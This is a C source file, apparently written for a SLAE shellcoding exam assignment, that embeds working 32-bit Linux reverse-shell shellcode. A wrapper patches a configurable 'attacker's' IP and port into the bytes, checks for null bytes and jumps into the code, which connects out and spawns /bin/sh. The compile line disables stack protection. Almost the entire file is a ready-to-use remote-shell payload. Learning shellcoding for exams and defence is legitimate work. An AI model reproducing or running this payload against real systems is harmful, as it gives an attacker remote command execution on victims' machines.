/*
; License: This work is licensed under a Creative Commons
  Attribution-NonCommercial 4.0 International License.
; Filename: revwrapper.c
; Author:   Muhereza Herbert
; Website:  http://kilobytesecurity.com
;
; Purpose: SLAE Exam requirement Assignment Two
; USAGE: 
;       Edit constant variable 'PORT' to change the port to your preferred value >1024 && <=65535
;       Edit string variable 'IP' to change IP Addy to attacker's.
;       Compile: gcc -m32 -fno-stack-protector -z execstack revwrapper.c -o revwrapper
*/


#include <stdio.h>
#include <string.h>
#include <stdbool.h>

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\x43\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x89\xc6\x43\x31\xc0\x68\xc0\xa8\xf7\x80\x66\x68\x9d\xd1\x66\x53"
"\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x89\xc3\x31"
"\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31\xc0\x50"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53"
"\x89\xe1\xb0\x0b\xcd\x80";
// SET THE PORT HERE
const int PORT = 1026;
// SET THE IP HERE
char *IP = "192.168.247.128";

//  PORT OFFSET IN SHELLCODE(minus 1)
const int PORT_OFFSET = 28;
// IP (\xc0\xa8\xf7\x80\) OFFSET(minus 1) 
const int IP_OFFSET = 22;
 
static bool check_zeroes() {
	// check each byte in shellcode array for hexidecimal zero value, return false if zero found
	int x = 0;
	for(x = 0; x < sizeof(shellcode)-1; x++) {
		if (shellcode[x] == '\x00') return false;
	}
	return true;
}

static bool rport(char *buf, int port) {
	// Check if decimal port is valid
	if (port>65535 || port<1024) { return false; }
	// convert to hex
	*(short *)(buf+PORT_OFFSET) = port;
	// swap out the two bytes
	char temp = buf[PORT_OFFSET];
	buf[PORT_OFFSET] = buf[PORT_OFFSET+1];
	buf[PORT_OFFSET+1] = temp;
	// Error if port in Hex contains zeroes
	if (shellcode[PORT_OFFSET] == '\x00' || shellcode[PORT_OFFSET+1] == '\x00') {
	    printf("ERROR: Port in HEX contains zeroes\n"); 
	    return false;
	} else {
		//All is well!
		return true;
		}
}

static bool rip(char *buf, char *ip) {
	unsigned char value[4] = {0};
	size_t index = 0;
	while (*ip) {
		if (isdigit((unsigned char)*ip)) {
			value[index] *= 10;
			value[index] += *ip - '0';
		} else {
			index++;
			}
		ip++;
	}
	// check for zeroes in IP
	int i = 0; 
	for(i = 0; i < 4; i++) {
	    *(char *)(buf+IP_OFFSET+i) = value[i];
	    if (shellcode[IP_OFFSET+i] == '\x00') {
		printf(" HEX contains zeroes\n"); return false;
	    }
	}
	// Return true if all checks passed
	return true;
}

main () {
	//Dynamically change PORT to one configured on PORT constant variable
	if (!rport(shellcode, PORT)) {
		printf("ERROR: Invalid port\n");
		return 0;
	}
	//Dynamically change PORT to one configured on PORT constant variable
    if (!rip(shellcode, IP)) {
        printf("ERROR: Invalid IP\n");
        return 0;
    }
	//Check for zeroes in shellcode
    if (!check_zeroes()) {
        printf("ERROR: Your shellcode contains NULLs!\n");
        return 0;
    }	
	// Print shellcode length.
	printf("Length of Shellcode:  %d\n", strlen(shellcode));
	__asm__ (
	// Clear registers
	"xor %eax, %eax\n\t"
	"xor %ebx, %ebx\n\t"
	"xor %ecx, %ecx\n\t"
	"xor %edx, %edx\n\t"
	"xor %esi, %esi\n\t"
	"xor %ebp, %ebp\n\t"
	// then execute shellcode
	"jmp shellcode");
}
